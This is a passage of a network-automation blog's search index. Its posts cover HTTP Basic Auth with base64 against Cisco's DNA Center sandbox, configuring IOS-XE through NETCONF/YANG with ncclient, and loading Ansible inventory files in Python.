ACL entries should already exist stored in version control. Then if you are simply adding a new entry to all devices you can update your IAC and pull from that template to be deployed to your device. Still though, there are the mandatory fields that need to be included in the HTTP PUT such as the hostname, default-gw and management IP and netmask.</p>","tags":["Cisco","Python"]},{"location":"2021/03/02/initial-thoughts-on-cisco-nfvis-api/#closing-words","title":"Closing Words","text":"<p>My experience so far with the NFVIS API for data gathering and reporting has been a positive one. I can't say the same about making configuration changes via the API though. I'm still exploring the API and trying to find a more reasonable way to make configuration changes, as well as automating the deployment of new image files using SCP and registering those images via the API. Once I have experimented with this further I'll post about it with my experience!</p>","tags":["Cisco","Python"]},{"location":"2021/03/10/base64-encoding-with-http-basic-auth-for-apis/","title":"Base64 Encoding with HTTP Basic Auth for API's","text":"<p>I have been exploring the Cisco DNA Center REST API as part of studying for the Cisco Certified DevNet Associate certification exam. Today while reading through the official certification guide it talked about how authorization into the API required that your credentials be passed as a base64 encoded string, but it didn't indicate how to accomplish this.</p> <p>For those that aren't familiar with Cisco's DevNet Sandboxes, Cisco provides free access to read-only always-on and reservation based sandbox environments. These environments permit a developer access to a wide variety of technologies that Cisco customers deploy, including ACI, ISE, FirePower FMC, Viptela vManage, StealthWatch, Umbrella, Webex Meetings, and many more. The one that I'm currently exploring is the Cisco DNA Center REST API. This article is going to briefly explain base64 encoding and how to use it for authorization with REST API's, specifically Cisco DNA Center. If you wanted to follow along, open up the Always-On sandbox for Cisco DNA Center AO 2.1.2.5.</p>","tags":["Cisco","Python"]},{"location":"2021/03/10/base64-encoding-with-http-basic-auth-for-apis/#what-is-base64-encoding","title":"What is base64 encoding?","text":"<p>There are quite a few articles out there, but the one that I found on Stack Abuse explained it quite well and simply enough. I encourage you to read the article to gain a better understand. The main highlights on base64:</p> <ul> <li>It's a conversion between bytes and ASCII characters</li> <li>There are 64 characters represented in total (26 Uppercase, 26 Lowercase, 10 numbers, and + and / characters)</li> <li>Important: base64 is not an encryption algorithm as it can be easily reversed, so should not be used for security purposes</li> </ul>","tags":["Cisco","Python"]},{"location":"2021/03/10/base64-encoding-with-http-basic-auth-for-apis/#using-base64-with-http-basic-auth","title":"Using base64 with HTTP Basic Auth","text":"<p>I have talked briefly about HTTP Basic Auth in my guide to the Cisco NFVIS API. It is an authentication scheme that includes your username and password in an HTTP 'Authentication' header. It is very important that when using Basic Auth that you use HTTPS, as the credentials are not encrypted in the HTTP headers. Security is dependent on HTTPS/TLS.</p> <p>Base64 encoding for authentication with a REST API will take on a few different forms, depending on the REST API so check the documentation. The Cisco DNA Center REST API documentation indicates that the usernamd and password should be represented as a string that is colon separated before being encoded as base64. In the case of Cisco's DevNet sandbox for DNA Center, that means the username and password would be:</p> <pre><code>devnetuser:Cisco123\n</code></pre> <p>Note</p> <p>Other API's may require you to separate the username and password with a + sign or another character.</p> <p>So how can you use this to authorize yourself against the DNA Center REST API? See the following steps using Pythons Request module.</p> <p>First lets import the base64 module and convert our username and password into a base64 encoded byte string.</p> <pre><code>&gt;&gt;&gt; import base64\n&gt;&gt;&gt; auth_str = 'devnetuser:Cisco123!'\n&gt;&gt;&gt; byte_str = auth_str.encode('ascii')\n&gt;&gt;&gt; byte_str\nb'devnetuser:Cisco123!'\n&gt;&gt;&gt; auth_b64 = base64.b64encode(byte_str)\n&gt;&gt;&gt; auth_b64\nb'ZGV2bmV0dXNlcjpDaXNjbzEyMyE='\n</code></pre> <p>You can see above that we can create a byte string using the <code>.encode('ascii')</code> function on our auth_str object. We need to do this because the base64.b64encode() function requires a bytes-like object. We then create an auth_b64 byte string which is now our username and password encoded the way the REST API will require it. If you are using another tool like cURL or Postman to test REST API's, you can take this string and set it in your HTTP headers. The rest of this article focuses on using it with Pythons Request module.</p> <p>To authenticate with the DNA Center REST API we need to send a POST request to <code>/dna/system/api/v1/auth/token</code> with an Authorization and Content-Type HTTP header, and if we successfully authenticate we will be returned an API token which we can use in subsequent API requests.</p> <pre><code>&gt;&gt;&gt; import requests\n&gt;&gt;&gt; headers = {\n...     'Authorization': 'Basic {}'.format(auth_b64.decode()),\n...     'Content-Type': 'application/json',\n... }\n&gt;&gt;&gt; AUTH_URL = 'https://sandboxdnac.cisco.com/dna/system/api/v1/auth/token'\n&gt;&gt;&gt; resp = requests.post(AUTH_URL, headers=headers, timeout=20, verify=False)\n&gt;&gt;&gt; resp.status_code\n200\n</code></pre> <p>In the above commands we imported the Requests package and set our HTTP headers with an Authorization header and Content-Type header that specifies we want to have data returned in JSON format. Not that for the Authorization header we actually need to perform a <code>decode()</code> on the byte string we previously created so that it is represented as a Python string object. This ensures that the REST API likes the data we send it. Finally, we send an HTTP POST request to the AUTH_URL and add our headers to the request. If you successfully authenticated you will see a response status code of 200/OK.</p> <p>The data that the REST API returns to us is actually a JSON response containing the authorization token we can use in subsequent API requests:</p> <pre><code>&gt;&gt;&gt; resp_data = resp.json()\n&gt;&gt;&gt; resp_data.keys()\ndict_keys(['Token'])\n&gt;&gt;&gt; resp_data['Token']\n'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2MDJjMGUyODE0NzEwYTIyZDFmN2UxNzIiLCJhdXRoU291cmNlIjoiaW50ZXJuYWwiLCJ0ZW5hbnROYW1lIjoiVE5UMCIsInJvbGVzIjpbIjYwMmJlYmU1MTQ3MTBhMDBjOThmYTQwOSJdLCJ0ZW5hbnRJZCI6IjYwMmJlYmU1MTQ3MTBhMDBjOThmYTQwMiIsImV4cCI6MTYxNTM4ODA4NCwiaWF0IjoxNjE1Mzg0NDg0LCJqdGkiOiI5MjI3MmQ5Mi1lODRjLTRmMTUtOTFhNy1lNDI3ZmYwNmQxMDgiLCJ1c2VybmFtZSI6ImRldm5ldHVzZXIifQ.ZyJAEvSsjKm7Re-uTnXN7kyVf_pYVHwrmLl9m3z39XEkWUncWQhjRYybhgkUjVolJM10oaL31miWXRefZA0DYjXD0bW7zta_5Lr9AyFV66stosDtpzC_80Frh_n5oVi4gR4lvFtqPWixTrSB4c4aJxF1TqkFMUX8q_HpyDC0pcIRVOtyjTKltcmG8USOQQhPEMLW6vdwP8JEfK7HJUPuj0cMpIlXALqJE_k-5qvxHbNWWiIIST99wPGKAAA35aN_02THNSTuRF_bm2Oxr4ScWuwou3TwKIajB5Bp4jg-sTboO5NzRnGhkq9ZcA_S0j22KgceD2W431e6q1f7wK4_7g'\n&gt;&gt;&gt;\n</code></pre> <p>This response token is actually a JSON Web Token (JWT) and if you plug it into the debugger at jwt.io you can see some additional details. The benefits of using a token for authorization subsequent API calls are:</p> <ul> <li>They are stateless, meaning the server receiving the request can validate them immediately as they are signed with a public key</li> <li>They have an expiration date/time</li> <li>They can be revoked by the server if they are compromised</li> <li>They are signed, so they can't be tampered with</li> </ul>","tags":["Cisco","Python"]},{"location":"2021/03/10/base64-encoding-with-http-basic-auth-for-apis/#a-quicker-way-of-using-http-basic-auth-with-requests","title":"A quicker way of using HTTP Basic Auth with Requests","text":"<p>The above example of importing the base64 module and converting the username/password was used to demonstrate base64 encoded strings for HTTP Basic Auth. The good news is the Python Requests module includes a shortcut for you by importing requests.auth.HTTPBasicAuth. This makes it far simpler to use as demonstrated in this example.</p> <pre><code>&gt;&gt;&gt; import requests\n&gt;&gt;&gt; from requests.auth import HTTPBasicAuth\n&gt;&gt;&gt; headers = {'Content-Type': 'application/json',}\n&gt;&gt;&gt; username = 'devnetuser'\n&gt;&gt;&gt; password = 'Cisco123!'\n&gt;&gt;&gt; AUTH_URL = 'https://sandboxdnac.cisco.com/dna/system/api/v1/auth/token'\n&gt;&gt;&gt; resp = requests.post(\n...     AUTH_URL,\n...     headers=headers,\n...     timeout=20,\n...     verify=False,\n...     auth=HTTPBasicAuth(username, password))\n&gt;&gt;&gt; resp.status_code\n200\n&gt;&gt;&gt; resp_data = resp.json()\n&gt;&gt;&gt; resp_data['Token']\n'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2MDJjMGUyODE0NzEwYTIyZDFmN2UxNzIiLCJhdXRoU291cmNlIjoiaW50ZXJuYWwiLCJ0ZW5hbnROYW1lIjoiVE5UMCIsInJvbGVzIjpbIjYwMmJlYmU1MTQ3MTBhMDBjOThmYTQwOSJdLCJ0ZW5hbnRJZCI6IjYwMmJlYmU1MTQ3MTBhMDBjOThmYTQwMiIsImV4cCI6MTYxNTM4OTA2OCwiaWF0IjoxNjE1Mzg1NDY4LCJqdGkiOiJlMTI3ODRjZC1iOGYyLTRlMzQtOGRhOS01ZWJkNTk5MTRlMTIiLCJ1c2VybmFtZSI6ImRldm5ldHVzZXIifQ.kKOBqO-eBJTDqK7t3heN057wVQLMTzGGbPn1vL4SQcvMsd2LLQ6CBn2Mr1QPgluit11gzjx3wM7FOLRJILBbZhhbSxSDymfZoNu2CZzdtIy7yz53bDDHwWMf5m8ymqBrFfb-Si8W_vEaT5XTbyjAydWyMiWN4l7ddKH7PC6h6ZoFdI6ko3bFh8H3j3IvSG64dFQp5OLzrMWmKaxqr2OvdlJMo_bXKuuW1pBr8ifjuaPTs3dKhVjbsIrxeQ7fgmvHge5pvfmzPQqEFV-yNYR9fNwEZ8T3FyLKfD_O2NCPiiw5RsYqUWZQkvAT7kqvOeluLHvrTwn3sHvHvGqxhncs2Q'\n&gt;&gt;&gt;\n</code></pre>","tags":["Cisco","Python"]},{"location":"2021/03/10/base64-encoding-with-http-basic-auth-for-apis/#http-basic-auth-with-ansible-uri-module","title":"HTTP Basic Auth with Ansible URI Module","text":"<p>While I haven't use HTTP Basic Auth with Ansible's URI module, it appears to support this authentication mechanism by providing the url_password and url_username parameters. You potentially need to set the force_basic_auth parameter to True if the REST API you're working with doesn't send an HTTP 401 status code on an initial request.</p> <p>And with that I'm hoping you have gained a better understanding of base64 encoding and HTTP Basic Auth with REST API's!</p>","tags":["Cisco","Python"]},{"location":"2021/03/18/exploring-netconf-and-yang-on-cisco-ios-xe/","title":"Exploring NETCONF and YANG on Cisco IOS-XE","text":"<p>I have been reading up on model-driven programmability using NETCONF and YANG models and found myself playing around with these after a Reddit user was having difficulty updating a Cisco IOS-XE interface description and VLAN. Other than reading about YANG and getting the basic capabilities from my lab router, I hadn't actually configured anything using NETCONF and YANG models before so this seemed like a good challenge to get me thinking in the right mindset. I suspected that it had to do with the XML namespace the user was referencing, but I had to figure out a way to prove it. In this post I will cover a little bit about NETCONF/YANG as well as how you can explore using it with your Cisco devices. This guide isn't meant to be a complete overview of these protocols, just something to get you started on learning about them.</p>","tags":["Cisco","Python","Automation"]},{"location":"2021/03/18/exploring-netconf-and-yang-on-cisco-ios-xe/#what-is-netconf","title":"What is NETCONF?","text":"<p>Traditionally, network devices have been configured using their CLI's or through SNMP. While CLI's are great for one-off configurations, they are proprietary to each vendor, and configuring network devices this way doesn't scale well. SNMP can be used to configure portions of a network devices configuration, but it too doesn't scale well and lacks writeable MIB's for all components of a devices configuration, it is also not secure depending on the version you are using. These were recognized as limitations by the IETF and as a result NETCONF was conceived with the following goals for automation of network device configuration:</p> <ul> <li>There must be a secure communication channel</li> <li>The protocol must include operations for making configuration changes as well as obtaining operational data and statistics</li> <li>It should have the capabilities to send PUSH notifications (similar to SNMP traps), either when an event happens or at regular intervals</li> </ul> <p>NETCONF operations in a client/server model with the server being the network device and the client being a station the network administrator controls. NETCONF doesn't itself define the format of the data, it provides a means for communicating programmatically with network devices based on a set of defined operations. These operations allow you to get/edit/delete the configuration or portions of it, save the configuration, and get state information. NETCONF message use XML-formatted messages in RPC's to communicate with network devices, but don't be too discouraged by this as Python's ncclient makes this easy to work with.</p> <p>NETCONF allows for multiple data stores on a device representing areas like the running-configuration, startup-configuration, or candidate-configuration. The idea of a candidate configuration is great because it allows for making configuration changes to the device without affecting the running-configuration directly!</p>","tags":["Cisco","Python","Automation"]},{"location":"2021/03/18/exploring-netconf-and-yang-on-cisco-ios-xe/#what-is-yang","title":"What is YANG?","text":"<p>YANG stands for \"Yet another next generation\" data model and is now used with NETCONF. Because NETCONF doesn't define how the data is represented, YANG provides a structured data model that represents your network devices configuration or the telemetry data you might be getting from it. YANG is expressed in XML, which is easy to read and write. Each network device must provide support for YANG modules (AKA namespaces), some of which are well-known and some which are vendor specific. These modules represent tree's within your configuration or state data that you can reference, and define the layout and the data types that might be returned (ex. binary, bits, int, string, etc). I don't think its necessary to understand how to write a YANG module, but it is certainly helpful to know how to read a module if you're ever needing to understand how to configure something and how it will be represented. That being said, this blog post identifies a more exploratory method that you can use with your network device directly.</p>","tags":["Cisco","Python","Automation"]},{"location":"2021/03/18/exploring-netconf-and-yang-on-cisco-ios-xe/#enabling-netconf-on-cisco-ios-xe","title":"Enabling NETCONF on Cisco IOS-XE","text":"<p>Before we can communicate with a network device using NETCONF we need to enable the protocol first. NETCONF uses SSH as a transport and it is served on TCP port 830 by default on Cisco IOS-XE. I have a Cisco IOS-XE CSRv router running 16.3.5 in my home lab that I will be testing with. To enable NETCONF use the following commands:</p> <pre><code>R1#config t\nEnter configuration commands, one per line.  End with CNTL/Z.\nR1(config)#netconf-yang\n</code></pre> <p>To verify that the NETCONF processes are now functioning</p> <pre><code>R1#show platform software yang-management process\nconfd            : Running\nnesd             : Running\nsyncfd           : Running\nncsshd           : Running\ndmiauthd         : Running\nvtyserverutild   : Running\nopdatamgrd       : Running\nngnix            : Running\n</code></pre> <p>Warning</p> <p>You should take great care in ensuring that all the necessary security practices have been put in place to secure your network device. Enabling NETCONF, just like any other management protocol or feature, exposes another attack surface on your network device.</p>","tags":["Cisco","Python","Automation"]},{"location":"2021/03/18/exploring-netconf-and-yang-on-cisco-ios-xe/#which-modules-are-supported","title":"Which modules are supported?","text":"<p>Not all network devices support all YANG modules out of the box, you may need to load modules for additional functionality. But, lets see how to identify which YANG modules are supported. We will be using Pythons ncclient library to communicate with the lab router.</p> <p>To establish a NETCONF session with our router you can use the ncclient.manager.connect() function</p> <pre><code>&gt;&gt;&gt; from ncclient import manager\n&gt;&gt;&gt; host = '192.168.11.11'\n&gt;&gt;&gt; username = 'admin'\n&gt;&gt;&gt; password = 'badpassword'\n&gt;&gt;&gt; port = '830'\n&gt;&gt;&gt; device = manager.connect(host=host, username=username, password=password, port=port)\n&gt;&gt;&gt; device\n&lt;ncclient.manager.Manager object at 0x107e594c0&gt;\n</code></pre> <p>The device variable is an ncclient.manager.Manager object which exposes additional functionality for communicating with your network device using NETCONF. To see which modules the network device has available we can use the device.server_capabilities iterator. This prints a very long list of capabilities, but these are the various YANG modules and namespaces we have available to us:</p> <pre><code>&gt;&gt;&gt; for cap in device.server_capabilities:\n...     print(cap)\n...\nurn:ietf:params:netconf:base:1.0\nurn:ietf:params:netconf:base:1.1\nurn:ietf:params:netconf:capability:writable-running:1.0\nurn:ietf:params:netconf:capability:xpath:1.0\nurn:ietf:params:netconf:capability:validate:1.0\nurn:ietf:params:netconf:capability:validate:1.1\nurn:ietf:params:netconf:capability:rollback-on-error:1.0\nurn:ietf:params:netconf:capability:notification:1.0\nurn:ietf:params:netconf:capability:interleave:1.0\nhttp://tail-f.com/ns/netconf/actions/1.0\nhttp://tail-f.com/ns/netconf/extensions\nurn:ietf:params:netconf:capability:with-defaults:1.0?basic-mode=report-all\nurn:ietf:params:xml:ns:yang:ietf-netconf-with-defaults?revision=2011-06-01&amp;module=ietf-netconf-with-defaults\nhttp://cisco.com/ns/yang/ned/ios?module=ned&amp;revision=2016-09-19\nurn:cisco:params:xml:ns:yang:cisco-acl-oper?module=cisco-acl-oper&amp;revision=2016-03-30\nurn:cisco:params:xml:ns:yang:cisco-bfd-state?module=cisco-bfd-state&amp;revision=2015-04-09\nurn:cisco:params:xml:ns:yang:cisco-bgp-state?module=cisco-bgp-state&amp;revision=2015-10-16\n&lt;&lt;&lt;SNIP&gt;&gt;&gt;\n</code></pre>","tags":["Cisco","Python","Automation"]},{"location":"2021/03/18/exploring-netconf-and-yang-on-cisco-ios-xe/#obtaining-the-running-configuration","title":"Obtaining the running-configuration","text":"<p>So back to our original problem of how to configure an interface description using NETCONF from the Reddit post, lets assume we don't know which of the above namespaces to use. I have manually configured an interface description on GigabitEthernet1:</p> <pre><code>R1#show int desc\nInterface                      Status         Protocol Description\nGi1                            up             up       TEST DESCRIPTION\nGi2                            up             up\n</code></pre> <p>To get the current running-configuration using NETCONF we need to use the get_config() function in ncclient and specify a source data-store of 'running'. I'm using Python's xmltodict library to convert this to a Python dictionary to make this easy for us to read</p> <pre><code>&gt;&gt;&gt; import xmltodict\n&gt;&gt;&gt; xml_config = device.get_config(source='running').data_xml\n&gt;&gt;&gt; config = xmltodict.parse(xml_config)\n</code></pre> <p>Within this new dictionary we have various keys available to us:</p> <pre><code>&gt;&gt;&gt; config.keys()\nodict_keys(['data'])\n&gt;&gt;&gt; config['data'].keys()\nodict_keys(['@xmlns', '@xmlns:nc', 'native', 'netconf-yang', 'aaa', 'SNMPv2-MIB', 'interfaces', 'nacm', 'routing'])\n</code></pre> <p>The most likely key for us to find interface related information is the 'interfaces' key:</p> <pre><code>&gt;&gt;&gt; config['data']['interfaces'].keys()\nodict_keys(['@xmlns', 'interface'])\n&gt;&gt;&gt; config['data']['interfaces']['@xmlns']\n'urn:ietf:params:xml:ns:yang:ietf-interfaces'\n</code></pre> <p>I've shown above that the '@xmlns' key provides us with the namespace (<code>urn:ietf:params:xml:ns:yang:ietf-interfaces</code>) that is used to configure this part of the XML tree. But to see the actual configuration of an interface we need to now use the 'interface' key. This part of the dictionary is actually an ordered list of the interfaces and their configuration and you can see below that index 0 is GigabitEthernet1 with the description of 'TEST DESCRIPTION':</p> <pre><code>&gt;&gt;&gt; config['data']['interfaces']['interface'][0]\nOrderedDict([('name', 'GigabitEthernet1'), ('description', 'TEST DESCRIPTION'), ('type', OrderedDict([('@xmlns:ianaift', 'urn:ietf:params:xml:ns:yang:iana-if-type'), ('#text', 'ianaift:ethernetCsmacd')])), ('enabled', 'true'), ('ipv4', OrderedDict([('@xmlns', 'urn:ietf:params:xml:ns:yang:ietf-ip')])), ('ipv6', OrderedDict([('@xmlns', 'urn:ietf:params:xml:ns:yang:ietf-ip')]))])\n&gt;&gt;&gt; config['data']['interfaces']['interface'][1]\nOrderedDict([('name', 'GigabitEthernet2'), ('type', OrderedDict([('@xmlns:ianaift', 'urn:ietf:params:xml:ns:yang:iana-if-type'), ('#text', 'ianaift:ethernetCsmacd')])), ('enabled', 'true'), ('ipv4', OrderedDict([('@xmlns', 'urn:ietf:params:xml:ns:yang:ietf-ip'), ('address', OrderedDict([('ip', '192.168.11.11'), ('netmask', '255.255.255.0')]))])), ('ipv6', OrderedDict([('@xmlns', 'urn:ietf:params:xml:ns:yang:ietf-ip')]))])\n</code></pre>","tags":["Cisco","Python","Automation"]},{"location":"2021/03/18/exploring-netconf-and-yang-on-cisco-ios-xe/#modifying-the-configuration","title":"Modifying the configuration","text":"<p>To modify the interface description of GigabitEthernet1 to something new we first need to identify XML YANG data that we will be sending back. Do so by creating a variable with this information:</p> <pre><code>&gt;&gt;&gt; new_desc = \"\"\"\n... &lt;config&gt;\n... &lt;interfaces xmlns=\"urn:ietf:params:xml:ns:yang:ietf-interfaces\"&gt;\n... &lt;interface&gt;\n... &lt;name&gt;GigabitEthernet1&lt;/name&gt;\n... &lt;description&gt;NEW DESCRIPTION&lt;/description&gt;\n... &lt;/interface&gt;\n... &lt;/interfaces&gt;\n... &lt;/config&gt;\"\"\"\n</code></pre> <p>The above variable shows that we are entering the <code>&lt;config&gt;</code> element and then the <code>&lt;interfaces&gt;</code> element and here we provide our namespace that we obtained previously. This particular namespace is a list of interfaces that are configured so we enter the <code>&lt;interface&gt;</code> namespace and provide a few variables including <code>&lt;name&gt;</code> to specify we want to modify GigabitEthernet1 as well as the new <code>&lt;description&gt;</code>. We can now send this data back to the network device using the edit_config() function and providing the target data-store of the running-configuration:</p> <pre><code>resp = device.edit_config(new_desc, target='running')\n&gt;&gt;&gt; resp\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;rpc-reply xmlns=\"urn:ietf:params:xml:ns:netconf:base:1.0\" message-id=\"urn:uuid:67934666-faf8-421c-a5db-b2b8809d3421\" xmlns:nc=\"urn:ietf:params:xml:ns:netconf:base:1.0\"&gt;&lt;ok/&gt;&lt;/rpc-reply&gt;\n</code></pre> <p>To confirm that this has been posted correctly to the device, you can see in the above <code>resp</code> variable that an RPC OK message was returned. We also see the interface description modified on the CLI of the device:</p> <pre><code>R1#show int desc\nInterface                      Status         Protocol Description\nGi1                            up             up       NEW DESCRIPTION\nGi2                            up             up\n</code></pre>","tags":["Cisco","Python","Automation"]},{"location":"2021/03/18/exploring-netconf-and-yang-on-cisco-ios-xe/#saving-the-configuration","title":"Saving the configuration","text":"<p>The above section on modifying the configuration only targetted the 'running' data-store, which is the running-configuration. If this device were to reload, that configuration change would be gone completely. The ncclient provides a commit() function, but that only works on devices that have candidate configuration capabilities enabled:</p> <pre><code>&gt;&gt;&gt; device.commit()\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\n  File \"/Users/byaklin/Documents/Training/Cisco/DEVASC/venv/lib/python3.9/site-packages/ncclient/manager.py\", line 239, in execute\n    return cls(self._session,\n  File \"/Users/byaklin/Documents/Training/Cisco/DEVASC/venv/lib/python3.9/site-packages/ncclient/operations/rpc.py\", line 311, in __init__\n    self._assert(cap)\n  File \"/Users/byaklin/Documents/Training/Cisco/DEVASC/venv/lib/python3.9/site-packages/ncclient/operations/rpc.py\", line 386, in _assert\n    raise MissingCapabilityError('Server does not support [%s]' % capability)\nncclient.operations.errors.MissingCapabilityError: Server does not support [:candidate]\n</code></pre> <p>Instead, I found on Cisco DevNet's Github a method of using the cisco-ia:save-config namespace to accomplish this.</p> <pre><code># In addition to the manage import, also import xml_\n&gt;&gt;&gt; from ncclient import manager, xml_\n# Create a new XML text string calling the save-config namespace\n&gt;&gt;&gt; save_config = \"\"\"\n... &lt;cisco-ia:save-config xmlns:cisco-ia=\"http://cisco.com/yang/cisco-ia\"/&gt;\"\"\"\n# Using the dispatch() function send an XML element\n&gt;&gt;&gt; resp = device.dispatch(xml_.to_ele(save_config))\n# The response XML indicates that the running configuration was saved successfully!\n&gt;&gt;&gt; resp\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;rpc-reply xmlns=\"urn:ietf:params:xml:ns:netconf:base:1.0\" message-id=\"urn:uuid:b41a1b19-c729-4e80-ab72-ac49dfd1a695\" xmlns:nc=\"urn:ietf:params:xml:ns:netconf:base:1.0\"&gt;&lt;result xmlns='http://cisco.com/yang/cisco-ia'&gt;Save running-config successful&lt;/result&gt;\n&lt;/rpc-reply&gt;\n</code></pre> <p>And with that we have now modified the interface description in the running-configuration and saved it to the startup-configuration!</p>","tags":["Cisco","Python","Automation"]},{"location":"2021/03/18/exploring-netconf-and-yang-on-cisco-ios-xe/#interested-in-learning-more","title":"Interested in learning more?","text":"<p>If you're interested in learning more, check out Cisco's DevNet Learning Labs, specifically the IOS-XE Programmability lab that covers NETCONF and RESTCONF.</p>","tags":["Cisco","Python","Automation"]},{"location":"2021/07/22/increase-network-change-implementation-success-external/","title":"Increase Network Change Implementation Success (External)","text":"<p>Having worked in the Network Management / Operations industry for over 15 years, I have been involved in the implementation of network changes on many ocassions. I have also helped drive process transformation of how various teams implement changes based on best practices that I have picked up along the way. I've written a blog post for my employeer Optanix on some steps that you can take to help increase confidence and success in network changes.</p> <p>Read Increase Implementation Success With a Proven Network Change MAnagement Process for more details and let me know what you think!</p>","tags":["Network Management"]},{"location":"2021/07/22/how-to-upgrade-cisco-asa-firewalls-external/","title":"How to Upgrade Cisco ASA Firewalls (External)","text":"<p>With the ever increasing number of vulnerabilities and security advisories that are released by networking vendors, having a well defined plan for performing software upgrades each platform in your network is critical. Cisco ASA firewalls are most commonly deployed at the edge of your network, many times with interfaces that are connected to the public network or to a network that you may not manage. I've written a blog post for my employer Optanix that defines a well-defined plan for upgrading Cisco ASA firewalls.</p> <p>Read How to Upgrade Cisco ASA Firewalls for more details and let me know what you think!</p>","tags":["Network Management","Security","Cisco"]},{"location":"2021/08/05/using-ansible-inventory-files-in-python-scripts/","title":"Using Ansible Inventory Files in Python Scripts","text":"<p>With the various methods for performing network automation, one of the challenging aspects to consider is inventory management. One of the tools available to us is Ansible which expects an inventory file in YAML format with specific variable or to use a dynamic inventory. But Ansible doesn't solve all automation use-cases. I have used Ansible for configuration management, but I have also used many different Python scripts for generating reports and performing complex operations that seemed easier to implement directly in Python than in Ansible. There is no 'one size fits all' solution to network automation.</p> <p>While there are systems out there, such as NetBox, as a source of truth for inventory management, we don't always have the luxury of these tools. In this article I present a way to use Ansible inventory files directly in our Python scripts. While there are a few caveats (discussed below), this might be a solution that fits your use-case.</p>","tags":["Python","Automation","Ansible"]},{"location":"2021/08/05/using-ansible-inventory-files-in-python-scripts/#requirements-and-caveats","title":"Requirements and Caveats","text":"<p>The examples in this article use Ansible version 2.11.1 and Python 3.8.10. We will be using the Ansible Python API for reading our inventory file to identify hosts and their variables.</p> <p>This method works well if you are setting your group variables directly in your inventory file. So far I have not found a method that allows you to load your group_vars files in addition to your inventory file. Additionally, I have not found a method that will allow for loading Ansible Vault variables that are in these files. If I find a method to do this in the future I will be sure to provide an update! If you are aware of how to do this, I would love to hear from you!</p>","tags":["Python","Automation","Ansible"]},{"location":"2021/08/05/using-ansible-inventory-files-in-python-scripts/#inventory-file","title":"Inventory File","text":"<p>This article will be using an inventory file named hosts.yaml, as shown below:</p> <pre><code>---\nall:\n  hosts:\n    RouterA:\n      ansible_host: 192.168.10.150\n      syslog_servers:\n        - 192.168.1.1\n        - 192.168.1.2\n    SwitchA:\n      ansible_host: 192.168.10.151\n  vars:\n    syslog_servers:\n      - 10.1.1.1\n      - 10.1.1.2\n  children:\n    ios:\n      hosts:\n        RouterA:\n    nxos:\n      hosts:\n        SwitchA:\n</code></pre> <p>We have two hosts (RouterA and SwitchA) and a three different groups (all, ios, nxos). Additionally, there is a variable named syslog_servers which applies two IP addresses (10.1.1.1 and 10.1.1.2) to all hosts, with that being overwritten for RouterA to two diffrent IP addresses (192.168.1.1 and 192.168.1.2).</p>","tags":["Python","Automation","Ansible"]},{"location":"2021/08/05/using-ansible-inventory-files-in-python-scripts/#using-the-ansible-python-api","title":"Using the Ansible Python API","text":"<p>To read the hosts.yaml file with Python in a convenient fashion we can use the Ansible Python API. While there are many methods for use within the API (such as for running Playbooks), this blog post is specifically focused on reading the inventory file to identify hosts, their IP addresses, groups, and variables so that we can leverage this information in a custome Python script you may have.</p> <p>We will be using three classes to read our inventory file; InventoryManager, DataLoader and VariableManager. You can import these as follows:</p> <pre><code>&gt;&gt;&gt; from ansible.inventory.manager import InventoryManager\n&gt;&gt;&gt; from ansible.parsing.dataloader import DataLoader\n&gt;&gt;&gt; from ansible.vars.manager import VariableManager\n</code></pre> <p>We must first create an instance of DataLoader. This class is used to load and parse YAML or JSON data. We do not provide our inventory file directly to the DataLoader class, this will happen in the next step.</p> <pre><code>&gt;&gt;&gt; dl = DataLoader()\n</code></pre> <p>We now pass the DataLoader object and the name of our inventory file to the InventoryManager class. This class has a method named get_hosts() that we can use to return all hosts or a subset of hosts based on a pattern. It returns a list of Ansible inventory host objects. Later we will provide these objects to the VariableManager class instance to retreive variables for a particular host. Below I demonstrate creating the InventoryManager instance and using get_hosts() as well as a few other methods.</p> <pre><code>&gt;&gt;&gt; im = InventoryManager(loader=dl, sources=['hosts.yaml'])\n# Retreive all hosts\n&gt;&gt;&gt; im.get_hosts()\n[RouterA, SwitchA]\n# Retreive just the 'ios' group hosts\n&gt;&gt;&gt; im.get_hosts(pattern='ios')\n[RouterA]\n# Retreive all hosts that start with Switch\n&gt;&gt;&gt; im.get_hosts(pattern='Switch*')\n[SwitchA]\n# List the groups that are identified in the inventory file\n&gt;&gt;&gt; im.list_groups()\n['all', 'ios', 'nxos', 'ungrouped']\n</code></pre> <p>There are a few ways that you can retreive the variables associated with each host. If you know the specific host that you want variables for you could pass that host directly to the VariableManager instance, or if you need to work against a group of hosts you can iterate over the list which the get_hosts() method provides and pass each item to the VariableManager. I'll demonstrate a few of these below.</p> <pre><code># Create an instance of the VariableManager, passing it our DataLoader and InventoryManager class instances\n&gt;&gt;&gt; vm = VariableManager(loader=dl, inventory=im)\n# Pass a specific host object to the VariableManager\n&gt;&gt;&gt; my_host = im.get_host('RouterA')\n&gt;&gt;&gt; vm.get_vars(host=my_host)\n{'syslog_servers': ['192.168.1.1', '192.168.1.2'], 'inventory_file': '/home/byaklin/ansible/inventory/hosts.yaml', 'inventory_dir': '/home/byaklin/ansible/inventory', 'ansible_host': '192.168.10.150', 'inventory_hostname': 'RouterA', 'inventory_hostname_short': 'RouterA', 'group_names': ['ios'], 'ansible_facts': {}, 'playbook_dir': '/home/byaklin/ansible/inventory', 'ansible_playbook_python': '/usr/bin/python3', 'ansible_config_file': None, 'groups': {'all': ['RouterA', 'SwitchA'], 'ungrouped': [], 'ios': ['RouterA'], 'nxos': ['SwitchA']}, 'omit': '__omit_place_holder__6c71c9ad93fbde3c2d7cd7336c994199d4a97678', 'ansible_version': 'Unknown'}\n</code></pre> <p>The above example shows retreiving the variables for a single host (RouterA). There are many different variables/keys, but if we were to use these within our Python script we would primarily be wanting to use the ansible_host key, configuration related keys that our custom script might need such as syslog_servers (ex. if we were performing connectivity tests to the syslog servers from our host, or configuring the syslog server but we would probably do that directly in an Ansible playbook in the first place), as well as any groups the host is associated with.</p> <p>To iterate over all hosts and use their variables as part of a more complex script, we can use the returned list from the InventoryManager's get_hosts() method.</p> <pre><code># Iterate over all hosts\n&gt;&gt;&gt; for host in im.get_hosts():\n...     host_vars = 